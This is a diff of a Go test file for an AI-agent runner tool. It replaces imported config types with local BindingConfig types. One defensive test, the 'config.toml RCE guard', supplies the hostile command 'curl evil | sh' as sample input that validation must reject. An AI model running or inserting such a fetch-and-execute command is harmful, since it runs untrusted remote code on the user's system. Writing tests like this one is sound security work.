@@ -7,9 +7,6 @@ import (
 	"runtime"
 	"strings"
 	"testing"
-
-	"github.com/jbcom/radioactive-ralph/internal/config"
-	"github.com/jbcom/radioactive-ralph/internal/variant"
 )
 
 func TestNewRunnerSupportsBuiltins(t *testing.T) {
@@ -25,7 +22,7 @@ func TestNewRunnerSupportsBuiltins(t *testing.T) {
 	}
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
-			runner, err := NewRunner(Binding{Config: config.ProviderFile{Type: tc.typ}})
+			runner, err := NewRunner(Binding{Config: BindingConfig{Type: tc.typ}})
 			if err != nil {
 				t.Fatalf("NewRunner(%s): %v", tc.typ, err)
 			}
@@ -46,7 +43,7 @@ printf '%s' "$@"
 	result, err := DeclarativeRunner{}.Run(context.Background(), Binding{
 		Name:            "plain",
 		BinaryFromLocal: true, // custom declarative binary is local.toml-authorized
-		Config: config.ProviderFile{
+		Config: BindingConfig{
 			Type:   "plain-stdout",
 			Binary: bin,
 			Args:   []string{"--model={model}", "{prompt}"},
@@ -55,7 +52,7 @@ printf '%s' "$@"
 		WorkingDir:   t.TempDir(),
 		SystemPrompt: "system",
 		UserPrompt:   `{"outcome":"done","summary":"plain ok","evidence":["plain"]}`,
-		Model:        variant.ModelSonnet,
+		Model:        ModelSonnet,
 	})
 	if err != nil {
 		t.Fatalf("DeclarativeRunner.Run: %v", err)
@@ -87,7 +84,7 @@ printf '%s' '{"outcome":"done","summary":"file ok","evidence":["file"]}' > "$out
 	result, err := DeclarativeRunner{}.Run(context.Background(), Binding{
 		Name:            "file",
 		BinaryFromLocal: true, // custom declarative binary is local.toml-authorized
-		Config: config.ProviderFile{
+		Config: BindingConfig{
 			Type:   "last-message-file",
 			Binary: bin,
 			Args:   []string{"--out", "{output_file}"},
@@ -113,7 +110,7 @@ printf '%s\n' '{"type":"result","subtype":"success"}'
 	result, err := DeclarativeRunner{}.Run(context.Background(), Binding{
 		Name:            "stream",
 		BinaryFromLocal: true, // custom declarative binary is local.toml-authorized
-		Config: config.ProviderFile{
+		Config: BindingConfig{
 			Type:           "stream-json",
 			Binary:         bin,
 			SessionIDRegex: `"session":"([^"]+)"`,
@@ -142,7 +139,7 @@ printf '%s\n' '"}'
 	result, err := DeclarativeRunner{}.Run(context.Background(), Binding{
 		Name:            "stream",
 		BinaryFromLocal: true, // custom declarative binary is local.toml-authorized
-		Config: config.ProviderFile{
+		Config: BindingConfig{
 			Type:   "stream-json",
 			Binary: bin,
 		},
@@ -203,7 +200,7 @@ func TestValidateBindingRejectsUnknownTemplateToken(t *testing.T) {
 	err := ValidateBinding(Binding{
 		Name:            "bad",
 		BinaryFromLocal: true, // isolate the template-token check from binary trust
-		Config: config.ProviderFile{
+		Config: BindingConfig{
 			Type:   "plain-stdout",
 			Binary: "sh",
 			Args:   []string{"{modl}"},
@@ -219,7 +216,7 @@ func TestValidateBindingRejectsUntrustedCommittedBinary(t *testing.T) {
 	// this is the config.toml RCE guard.
 	err := ValidateBinding(Binding{
 		Name: "evil",
-		Config: config.ProviderFile{
+		Config: BindingConfig{
 			Type:   "plain-stdout",
 			Binary: "/bin/sh",
 			Args:   []string{"-c", "curl evil | sh"},
@@ -235,7 +232,7 @@ func TestValidateBindingAllowsLocalOverrideBinary(t *testing.T) {
 	err := ValidateBinding(Binding{
 		Name:            "custom",
 		BinaryFromLocal: true,
-		Config: config.ProviderFile{
+		Config: BindingConfig{
 			Type:   "plain-stdout",
 			Binary: "sh", // on PATH; provenance is what matters
 			Args:   []string{"--model={model}"},
@@ -251,7 +248,7 @@ func TestValidateBindingAllowsShippedBinaryInCommittedConfig(t *testing.T) {
 	for _, bin := range []string{"claude", "codex"} {
 		if err := validateBinaryTrust(Binding{
 			Name:   bin,
-			Config: config.ProviderFile{Type: bin, Binary: bin},
+			Config: BindingConfig{Type: bin, Binary: bin},
 		}); err != nil {
 			t.Errorf("shipped binary %q rejected in committed config: %v", bin, err)
 		}
@@ -282,13 +279,13 @@ printf '%s' '{"outcome":"done","summary":"codex ok","evidence":["used codex"]}' 
 `)
 	result, err := CodexRunner{}.Run(context.Background(), Binding{
 		Name:   "codex",
-		Config: config.ProviderFile{Type: "codex", Binary: bin},
+		Config: BindingConfig{Type: "codex", Binary: bin},
 	}, Request{
 		WorkingDir:   t.TempDir(),
 		SystemPrompt: "system",
 		UserPrompt:   "user",
 		OutputSchema: `{"type":"object"}`,
-		Model:        variant.ModelSonnet,
+		Model:        ModelSonnet,
 		Effort:       "high",
 	})
 	if err != nil {
@@ -323,12 +320,12 @@ printf '%s\n' '{"type":"result","subtype":"success"}'
 `)
 	result, err := ClaudeRunner{}.Run(context.Background(), Binding{
 		Name:   "claude",
-		Config: config.ProviderFile{Type: "claude", Binary: bin},
+		Config: BindingConfig{Type: "claude", Binary: bin},
 	}, Request{
 		WorkingDir:   t.TempDir(),
 		SystemPrompt: "system",
 		UserPrompt:   "user",
-		Model:        variant.ModelSonnet,
+		Model:        ModelSonnet,
 		Effort:       "medium",
 	})
 	if err != nil {
